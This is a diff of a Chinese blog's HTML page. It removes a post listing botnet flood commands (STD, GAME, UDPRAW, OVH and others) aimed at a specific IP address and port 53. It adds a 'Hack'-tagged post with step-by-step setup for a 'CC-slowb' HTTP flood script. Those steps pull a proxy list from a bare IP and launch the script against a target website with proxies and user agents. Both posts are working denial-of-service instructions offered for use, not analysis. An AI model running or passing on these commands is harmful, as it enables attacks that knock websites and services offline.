@@ -13,7 +13,7 @@
 
 
 
-<title>netbot之bot使用 | By:weizai Blog</title>
+<title>CC-slowb脚本的基础搭建 | By:weizai Blog</title>
 
 
 
@@ -127,76 +127,11 @@
                 <div class="container">
     
     
-        <div class="post-toc">
-    <div class="tocbot-list">
-    </div>
-    <div class="tocbot-list-menu">
-        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
-        <a onclick="go_top()">Back to top</a>
-        <a onclick="go_bottom()">Go to bottom</a>
-    </div>
-</div>
-
-<script>
-    var tocbot_timer;
-    var DEPTH_MAX = 6; // 为 6 时展开所有
-    var tocbot_default_config = {
-        tocSelector: '.tocbot-list',
-        contentSelector: '.post-content',
-        headingSelector: 'h1, h2, h3, h4, h5',
-        orderedList: false,
-        scrollSmooth: true,
-        onClick: extend_click,
-    };
-
-    function extend_click() {
-        clearTimeout(tocbot_timer);
-        tocbot_timer = setTimeout(function() {
-            tocbot.refresh(obj_merge(tocbot_default_config, {
-                hasInnerContainers: true
-            }));
-        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
-    }
-
-    document.ready(function() {
-        tocbot.init(obj_merge(tocbot_default_config, {
-            collapseDepth: 1
-        }));
-    });
-
-    function expand_toc() {
-        var b = document.querySelector('.tocbot-toc-expand');
-        var expanded = b.getAttribute('data-expanded');
-        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
-        tocbot.refresh(obj_merge(tocbot_default_config, {
-            collapseDepth: expanded ? 1 : DEPTH_MAX
-        }));
-        b.innerText = expanded ? 'Expand all' : 'Collapse all';
-    }
-
-    function go_top() {
-        window.scrollTo(0, 0);
-    }
-
-    function go_bottom() {
-        window.scrollTo(0, document.body.scrollHeight);
-    }
-
-    function obj_merge(target, source) {
-        for (var item in source) {
-            if (source.hasOwnProperty(item)) {
-                target[item] = source[item];
-            }
-        }
-        return target;
-    }
-</script>
-    
 
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">netbot之bot使用</h1>
+            <h1 class="post-title">CC-slowb脚本的基础搭建</h1>
             
                 <div class="post-meta">
                     
@@ -205,35 +140,42 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">June 3, 2024&nbsp;&nbsp;23:58:03</a>
+                        Date: <a href="#">June 26, 2024&nbsp;&nbsp;16:05:50</a>
                         </span>
                     
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Hack/">Hack</a>
+                            
+                        </span>
                     
                 </div>
             
         </header>
 
         <div class="post-content">
-            <h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!* STD 206.212.246.14 53 30</span><br></pre></td></tr></table></figure>
+            <p>我自己本身使用的是ubantu20</p>
+<p>1、直接安装nodejs</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y nodejs</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!* STD 206.212.246.14 53 30</span><br></pre></td></tr></table></figure>
+<p>2、上传cc相关脚本</p>
+<p>3、赋予777权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 slowb</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!* GAME 206.212.246.14 53 30</span><br></pre></td></tr></table></figure>
+<p>4、安装curl 由于代码中需要用到代理所以每次执行命令前下载最新代理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install curl</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!* XDT 206.212.246.14 53 30</span><br></pre></td></tr></table></figure>
+<p>5、下载代理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -O http://15.204.18.143/proxy.txt</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!* RANDHEX 206.212.246.14 53 30</span><br></pre></td></tr></table></figure>
+<p>6、开始抚摸</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./slowb 80 网址  proxy.txt 200 ua.txt</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">!* OVH 206.212.246.14 53 30 1024</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!* UDPRAW  206.212.246.14 53 30</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
+<p>注意！！！：如果是centos环境需要执行（下载安装node环境）：</p>
+<p>1、curl -fsSL <a target="_blank" rel="noopener" href="https://rpm.nodesource.com/setup_16.x">https://rpm.nodesource.com/setup_16.x</a> | sudo bash -</p>
+<p>2、sudo yum install -y nodejs</p>
 
         </div>
 
@@ -248,7 +190,7 @@
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="https://caoheike.github.io/2024/06/03/netbot%E4%B9%8Bbot%E4%BD%BF%E7%94%A8/">https://caoheike.github.io/2024/06/03/netbot%E4%B9%8Bbot%E4%BD%BF%E7%94%A8/</a></span>
+                        <span><a href="https://caoheike.github.io/2024/06/26/CC-slowb%E8%84%9A%E6%9C%AC%E7%9A%84%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA/">https://caoheike.github.io/2024/06/26/CC-slowb%E8%84%9A%E6%9C%AC%E7%9A%84%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA/</a></span>
                     </p>
                 
                 
@@ -271,6 +213,10 @@
                 <span>Tag(s):</span>
                 <span class="tag">
                     
+                    
+                        <a href="/tags/Hack/"># Hack</a>
+                    
+                        
                 </span>
             </div>
             <div>
@@ -281,10 +227,8 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/2024/06/03/idea%E5%BF%AB%E6%8D%B7%E9%94%AE/">idea快捷键</a>
             
-            
-            <a class="next" rel="next" href="/2024/06/03/%E4%BD%BF%E7%94%A8%E4%B8%80%E9%94%AE%E8%84%9A%E6%9C%AC%E6%90%AD%E5%BB%BAshadowsocks%E6%9C%8D%E5%8A%A1/">使用一键脚本搭建shadowsocks服务</a>
+            <a class="next" rel="next" href="/2024/06/19/hello-world/">Hello World</a>
             
         </section>
 
